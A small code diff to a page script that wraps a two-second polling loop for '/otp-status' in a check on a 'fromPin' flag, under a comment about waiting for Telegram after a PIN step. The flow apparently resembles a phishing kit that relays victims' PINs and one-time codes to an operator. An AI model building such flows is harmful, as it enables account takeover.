@@ -39,8 +39,10 @@ if (localStorage.getItem("firstProcess") === "yes") {
 }
 
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
+if (localStorage.getItem("fromPin") === "yes") {
 
     setInterval(async () => {
+    
 
         try {
             const res = await fetch("/otp-status");
@@ -75,6 +77,7 @@ if (localStorage.getItem("firstProcess") === "yes") {
         }
 
     }, 2000);
+}
 
 </script>
 
